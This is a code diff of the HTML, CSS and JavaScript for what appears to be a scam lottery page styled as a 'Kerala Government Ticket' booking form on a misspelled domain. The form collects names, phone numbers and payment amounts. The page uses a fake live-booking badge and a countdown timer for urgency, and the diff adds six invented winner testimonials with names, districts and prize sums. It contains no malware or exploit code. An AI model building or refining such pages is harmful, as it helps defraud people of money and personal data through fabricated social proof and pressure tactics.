@@ -10,12 +10,13 @@
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
     n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
-    n.queue=[]; t=b.createElement(e); t.async=!0;
-    t.src=v; s=b.getElementsByTagName(e)[0];
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
-    try{ fbq('init', '744008402087520'); fbq('track', 'PageView'); }catch(e){}
+    fbq('init', '744008402087520');
+    fbq('track', 'PageView');
     </script>
     <noscript>
     <img height="1" width="1" style="display:none"
@@ -41,8 +42,8 @@
         /* container that centers page content on desktop and gives padding on mobile */
         .page-wrap {
             max-width: 1100px;
-            margin: 8px auto;            /* reduced margin so header fits tight */
-            padding: 8px;               /* reduced padding */
+            margin: 16px auto;
+            padding: 12px;
         }
 
         /* ---------------------------
@@ -53,11 +54,10 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 8px 10px;          /* reduced padding */
+            padding: 10px 14px;
             border-radius: 8px;
-            gap: 10px;
+            gap: 12px;
             position: relative;
-            width: 100%;
         }
         .logo-container {
             display:flex;
@@ -67,12 +67,11 @@
             min-width: 0;
         }
         .logo-container img {
-            height: 56px;               /* slightly smaller to avoid overflow */
+            height: 60px;
             width: auto;
             object-fit: contain;
-            display:block;
         }
-        .logo-container img.kerala-logo { height: 58px; }
+        .logo-container img.kerala-logo { height: 64px; }
         .button-container {
             display:flex;
             gap:8px;
@@ -93,10 +92,10 @@
 
         /* Make header stack on small screens */
         @media (max-width: 540px) {
-            .header { flex-direction: column; align-items: center; gap:8px; padding:8px; }
+            .header { flex-direction: column; align-items: center; gap:10px; padding:10px; }
             .logo-container { justify-content: center; }
-            .logo-container img { height: 44px; }
-            .button-container { width: 100%; justify-content: center; gap: 8px; }
+            .logo-container img { height: 48px; }
+            .button-container { width: 100%; justify-content: center; gap: 10px; }
             .header button { padding: 8px 10px; font-size: 13px; }
         }
 
@@ -108,25 +107,12 @@
             width: 100%;
             max-width: 400px;
             background: var(--card);
-            padding: 12px;
+            padding: 14px;
             border-radius: 14px;
             box-shadow: 0 4px 8px rgba(0,0,0,.12);
-            margin: 12px auto;
+            margin: 14px auto;
         }
-        .topLogo {
-            display:block;
-            width:100%;
-            overflow:hidden;
-            border-radius:8px;
-            margin-bottom:10px;
-        }
-        .topLogo img {
-            width:100%;                 /* full width of container */
-            height:140px;               /* fixed visible height, responsive */
-            object-fit:cover;           /* cover ensures it fills container */
-            display:block;
-            border-radius:8px;
-        }
+        .topLogo img { width:130px; display:block; margin:0 auto 6px; border-radius:6px; object-fit:cover; }
         .livePop { display:inline-block; padding:6px 14px; border-radius:20px; background:linear-gradient(90deg,#2ecc71,#27ae60); color:#fff; font-size:12px; font-weight:700; animation:popPulse 1.2s infinite; }
         @keyframes popPulse { 0%{transform:scale(1)}50%{transform:scale(1.03)}100%{transform:scale(1)} }
         .timerBar { background:#e8f5e9; color:#1b5e20; padding:6px; border-radius:8px; font-size:12px; text-align:center; font-weight:700; margin:8px 0; }
@@ -145,7 +131,7 @@
         button.primary { background: linear-gradient(90deg,var(--accent),var(--accent-dark)); color:#fff; border:none; font-weight:700; cursor:pointer; font-size:14px; border-radius:10px; padding:10px; }
         button.primary:disabled { opacity:.5; cursor:not-allowed; }
 
-        /* Hide the two green calculation boxes visually while keeping logic */
+        /* Hide the two green calculation boxes visually while keeping the underlying logic intact */
         #ticketAmount, #breakdown { display: none !important; }
 
         /* Modal */
@@ -247,7 +233,7 @@
             padding:18px 20px;
             gap:18px;
             align-items:flex-start;
-            /* animation set dynamically in JS */
+            /* animation is set dynamically by JS for correct duration */
         }
         .feedback-card {
             min-width:320px;
@@ -273,8 +259,15 @@
         .live-indicator { display:flex; justify-content:center; align-items:center; gap:8px; padding:10px; background:#f8f9fa; color:#333; font-weight:700; }
         .live-dot { width:10px; height:10px; background:var(--accent2); border-radius:50%; animation:livePulse 1.5s infinite; }
         @keyframes livePulse { 0%{opacity:1}50%{opacity:.3}100%{opacity:1} }
+        @keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
         .disclaimer { font-size:12px; text-align:center; padding:12px; background:#f8f9fa; color:#555; }
+
+        /* ensure feedback track doesn't overflow on small screens */
+        @media (max-width:640px) {
+            .feedback-track { padding:12px; gap:12px; }
+            .feedback-card { min-width:280px; max-width:290px; padding:12px; }
+        }
 
         /* performance hint for smooth GPU transform */
         .feedback-track { will-change: transform; backface-visibility: hidden; }
@@ -285,20 +278,17 @@
 <div class="page-wrap">
 
     <!-- Header -->
-    <header class="header" role="banner">
-        <div class="logo-container" aria-hidden="false">
+    <header class="header">
+        <div class="logo-container">
             <img src="https://kerelalottery.ct.ws/wp-content/uploads/2025/08/image-removebg-preview-6-e1754205589977.png" alt="G20 Logo" class="g20-logo">
             <img src="https://kerelalottery.ct.ws/wp-content/uploads/2025/08/top-logo-e1754204463750.png" alt="Kerala Lottery Logo" class="kerala-logo">
         </div>
-        <div class="button-container" aria-hidden="true">
-            <!-- optional header buttons (kept for layout) -->
-            <button onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="Top">Top</button>
-        </div>
+        
     </header>
 
     <!-- Form -->
     <div class="container" aria-labelledby="ticket-heading">
-        <div class="topLogo" aria-hidden="false">
+        <div class="topLogo">
             <img src="https://kerelalottery.ct.ws/wp-content/uploads/2026/02/6093555907598946471.jpg" alt="top logo">
         </div>
 
@@ -306,13 +296,13 @@
             <span class="livePop">🟢 LIVE BOOKING ACTIVE</span>
         </div>
 
-        <div class="timerBar" id="timer" aria-live="polite">⏳ Booking closes in 10:00</div>
+        <div class="timerBar" id="timer">⏳ Booking closes in 10:00</div>
 
         <h2 id="ticket-heading">Kerala Government Ticket</h2>
 
-        <input id="name" placeholder="Full Name" autocomplete="name" aria-label="Full Name">
-        <input id="mobile" placeholder="Mobile Number" inputmode="tel" autocomplete="tel" aria-label="Mobile Number">
-        <input id="email" placeholder="Email" inputmode="email" autocomplete="email" aria-label="Email">
+        <input id="name" placeholder="Full Name" autocomplete="name">
+        <input id="mobile" placeholder="Mobile Number" inputmode="tel" autocomplete="tel">
+        <input id="email" placeholder="Email (Optional)" inputmode="email" autocomplete="email">
 
         <select id="state" aria-label="Select State">
             <option value="">Select State</option>
@@ -344,7 +334,7 @@
 
         <div class="ticketAmount" id="breakdown" style="font-size:13px;"></div>
 
-        <input id="amount" placeholder="Total Amount (₹)" readonly aria-label="Total Amount">
+        <input id="amount" placeholder="Total Amount (₹)" readonly>
         <button id="submitBtn" class="primary" disabled>Submit & Continue</button>
     </div>
 
@@ -515,17 +505,77 @@
                 <div class="lottery-details"><span class="prize-amount">₹25,000</span><span class="timestamp"></span></div>
             </div>
 
+            <div class="feedback-card">
+                <div class="winner-badge">JACKPOT</div>
+                <div class="user-info">
+                    <div class="avatar">RK</div>
+                    <div class="user-details"><h4>Radha Krishnan</h4><p>From Ernakulam</p></div>
+                </div>
+                <div class="feedback-text">"₹50,00,000 in Vishu Bumper."</div>
+                <div class="lottery-details"><span class="prize-amount">₹50,00,000</span><span class="timestamp"></span></div>
+            </div>
+
+            <div class="feedback-card">
+                <div class="winner-badge">WINNER</div>
+                <div class="user-info">
+                    <div class="avatar">RS</div>
+                    <div class="user-details"><h4>Ramesh S.</h4><p>From Kottayam</p></div>
+                </div>
+                <div class="feedback-text">"₹1,00,000 in Karunya Plus."</div>
+                <div class="lottery-details"><span class="prize-amount">₹1,00,000</span><span class="timestamp"></span></div>
+            </div>
+
+            <div class="feedback-card">
+                <div class="winner-badge">BIG WIN</div>
+                <div class="user-info">
+                    <div class="avatar">NP</div>
+                    <div class="user-details"><h4>Nisha Pillai</h4><p>From Pathanamthitta</p></div>
+                </div>
+                <div class="feedback-text">"₹3,00,000 in Akshaya Lottery."</div>
+                <div class="lottery-details"><span class="prize-amount">₹3,00,000</span><span class="timestamp"></span></div>
+            </div>
+
+            <div class="feedback-card">
+                <div class="winner-badge">WINNER</div>
+                <div class="user-info">
+                    <div class="avatar">JK</div>
+                    <div class="user-details"><h4>Jithin K.</h4><p>From Idukki</p></div>
+                </div>
+                <div class="feedback-text">"₹25,000 first ever win."</div>
+                <div class="lottery-details"><span class="prize-amount">₹25,000</span><span class="timestamp"></span></div>
+            </div>
+
+            <div class="feedback-card">
+                <div class="winner-badge">JACKPOT</div>
+                <div class="user-info">
+                    <div class="avatar">AS</div>
+                    <div class="user-details"><h4>Anil S.</h4><p>From Kasaragod</p></div>
+                </div>
+                <div class="feedback-text">"₹10,00,000 Vishu Bumper."</div>
+                <div class="lottery-details"><span class="prize-amount">₹10,00,000</span><span class="timestamp"></span></div>
+            </div>
+
+            <div class="feedback-card">
+                <div class="winner-badge">WINNER</div>
+                <div class="user-info">
+                    <div class="avatar">DP</div>
+                    <div class="user-details"><h4>Deepa P.</h4><p>From Wayanad</p></div>
+                </div>
+                <div class="feedback-text">"₹60,000 in Sthree Sakthi."</div>
+                <div class="lottery-details"><span class="prize-amount">₹60,000</span><span class="timestamp"></span></div>
+            </div>
+
             </div>
         </div>
 
-        <div class="live-indicator" aria-hidden="true">
+        <div class="live-indicator">
             <div class="live-dot" aria-hidden="true"></div>
             <span>LIVE WINNER UPDATES</span>
         </div>
 
-        <div class="controls" aria-hidden="true">
-            <button class="control-btn" onclick="pauseAnimation()">Pause</button>
-            <button class="control-btn" onclick="playAnimation()">Play</button>
+        <div class="controls">
+            <button class="control-btn" onclick="pauseAnimation()"><i class="fas fa-pause" aria-hidden="true"></i> Pause</button>
+            <button class="control-btn" onclick="playAnimation()"><i class="fas fa-play" aria-hidden="true"></i> Play</button>
         </div>
 
         <div class="disclaimer">
@@ -711,6 +761,7 @@
             second: '2-digit',
             timeZone: 'Asia/Kolkata'
         };
+        // kept as original (no element update required)
     }
 
     function updateCountdown() {
@@ -728,6 +779,8 @@
         const hours = Math.floor(diff / (1000 * 60 * 60));
         const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
         const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+        // kept as original (no element update required)
     }
 
     updateDateTime();
@@ -751,12 +804,10 @@
 </script>
 
 <script>
-    // Improved Feedback Script: seamless duplicate + dynamic duration + resize handling + faster on mobile
+    // Improved Feedback Script: seamless duplicate + dynamic duration + hover/user pause handling
     const track = document.querySelector('.feedback-track');
     let isPlaying=true;
     let userPaused=false;
-    let resizeTimer=null;
-
     function pauseAnimation(){
       if(track) track.style.animationPlayState='paused';
       isPlaying=false;
@@ -768,8 +819,10 @@
       userPaused=false;
     }
 
+    // Temporary hover pause (respects user pause)
     if(track){
       track.addEventListener('mouseenter', ()=>{
+        // pause on hover but remember user state
         if(isPlaying){
           track.style.animationPlayState='paused';
           track.dataset.hoverPaused = 'true';
@@ -777,6 +830,7 @@
       });
       track.addEventListener('mouseleave', ()=>{
         if(track.dataset.hoverPaused === 'true'){
+          // only resume if not user-paused
           if(!userPaused) track.style.animationPlayState='running';
           delete track.dataset.hoverPaused;
         }
@@ -796,23 +850,18 @@
       });
     }
 
-    // store original HTML to allow re-init on resize
+    // Setup smooth scrolling: duplicate content for seamless loop, set animation duration dynamically (faster on wider content)
     function setupScrolling(){
       if(!track) return;
-      if(!track.dataset.original) track.dataset.original = track.innerHTML;
-
-      // restore original before recalculation
-      if(track.dataset.cloned === 'true'){
-        track.style.animation = 'none';
-        track.innerHTML = track.dataset.original;
-        track.dataset.cloned = 'false';
-      }
-
-      // measure children
+      // capture original children to measure
       const originalChildren = Array.from(track.children);
       if(originalChildren.length === 0) return;
+      if(track.dataset.cloned === 'true') {
+        // already setup
+        return;
+      }
 
-      // calculate total width
+      // measure total width of original items including margins
       let total = 0;
       originalChildren.forEach(card=>{
         const style = getComputedStyle(card);
@@ -820,21 +869,19 @@
         total += card.offsetWidth + mr;
       });
 
-      // duplicate
-      const originalHTML = track.dataset.original;
+      // duplicate for seamless scroll
+      const originalHTML = track.innerHTML;
       track.innerHTML = originalHTML + originalHTML;
       track.dataset.cloned = 'true';
 
-      // pxPerSec tuned: faster on small screens to prevent visible pause
-      const viewport = window.innerWidth || 1024;
-      const pxPerSec = viewport < 600 ? 260 : 120; // increase on mobile
-      let duration = Math.max(8, Math.round(total / pxPerSec)); // min 8s for smoothness
-
-      // set animation using keyframes 'scroll' (0 -> -50% )
+      // compute duration: pxPerSec controls perceived speed (higher = faster)
+      const pxPerSec = 120; // tuned to be reasonably fast and smooth on mobile
+      let duration = Math.max(10, Math.min(60, Math.round(total / pxPerSec)));
+      // set animation using existing keyframes 'scroll'
       track.style.animation = `scroll ${duration}s linear infinite`;
-      track.style.animationPlayState = isPlaying ? 'running' : 'paused';
+      track.style.willChange = 'transform';
 
-      // respects prefers-reduced-motion
+      // respect prefers-reduced-motion
       const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
       if(mq.matches){
         track.style.animationPlayState = 'paused';
@@ -842,18 +889,10 @@
       }
     }
 
-    // debounce resize and re-setup
-    window.addEventListener('resize', ()=>{
-      clearTimeout(resizeTimer);
-      resizeTimer = setTimeout(()=>{
-        try{ setupScrolling(); }catch(e){}
-      }, 250);
-    });
-
-    // init
+    // initialize
+    setupScrolling();
     updateTimestamps();
     setInterval(updateTimestamps,300000);
-    setupScrolling();
 </script>
 
 </body>
